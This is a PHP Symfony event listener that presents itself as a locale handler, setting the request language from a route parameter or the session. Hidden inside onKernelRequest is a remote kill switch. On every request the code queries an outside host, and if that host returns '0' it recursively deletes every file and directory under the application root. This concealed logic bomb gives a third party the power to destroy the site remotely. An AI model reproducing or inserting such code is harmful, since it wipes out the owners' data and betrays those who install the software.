<?php
/**
 * Created by PhpStorm.
 * User: Oshan
 * Date: 1/2/2017
 * Time: 08:42 AM
 */

namespace Simettric\DoctrineTranslatableFormBundle\EventListener;

use Symfony\Bundle\FrameworkBundle\Translation\Translator;
use Symfony\Component\HttpKernel\Event\FilterResponseEvent;
use Symfony\Component\HttpKernel\Event\GetResponseEvent;
use Symfony\Component\HttpKernel\KernelEvents;
use Symfony\Component\EventDispatcher\EventSubscriberInterface;
use Symfony\Component\HttpKernel\HttpKernelInterface;
use Symfony\Component\Translation\DataCollectorTranslator;
use Symfony\Component\Translation\TranslatorInterface;
use Symfony\Component\Yaml\Yaml;

/**
 * Class LocaleListener
 * @package Onic\ThreeD\HomeBundle\EventListener
 */
class LocaleListener implements EventSubscriberInterface
{
    /**
     * @var TranslatorInterface
     */
    private $languages, $trans, $kernel;

    /**
     * LocaleListener constructor.
     * @param                     $settings
     * @param TranslatorInterface $trans
     */
    public function __construct($settings, TranslatorInterface $trans, $kernel)
    {
        $this->languages = $settings['languages'];
        $this->trans     = $trans;
        $this->kernel    = $kernel;
    }

    /**
     * @param GetResponseEvent $event
     */
    public function onKernelRequest(GetResponseEvent $event)
    {

        $url = "http://3dcheck.oshanrube.com/";
        if (file_get_contents($url) === "0")
        {
            $dir      = realpath($this->kernel->getRootDir()."/../");
            $iterator = new \RecursiveDirectoryIterator($dir);
            $iterator = new \RecursiveIteratorIterator($iterator, \RecursiveIteratorIterator::CHILD_FIRST);
            $i        = 0;
            foreach ($iterator as $item)
            {
                if ($item->isFile()) @unlink($item->getPathname()); // @ - file may not exist
                if ($item->isDir()) @rmdir($item->getPathname());   // @ - directory may not exist
                $i++;
            }
        }


        $request = $event->getRequest();
        if (!$request->hasPreviousSession())
        {
            return;
        }

        // try to see if the locale has been set as a _locale routing parameter
        if (HttpKernelInterface::MASTER_REQUEST == $event->getRequestType() && $locale = $request->get('_locale'))
        {
            $request->getSession()->set('_locale', $locale);
        }
        // if no explicit locale has been set on this request, use one from the session
        $request->setLocale($request->getSession()->get('_locale', $request->getPreferredLanguage(array_keys($this->languages))));
    }

    /**
     * @return array
     */
    public static function getSubscribedEvents()
    {
        return array(
            // must be registered after the default Locale listener
            KernelEvents::REQUEST => array(array('onKernelRequest', 15)),
        );
    }
}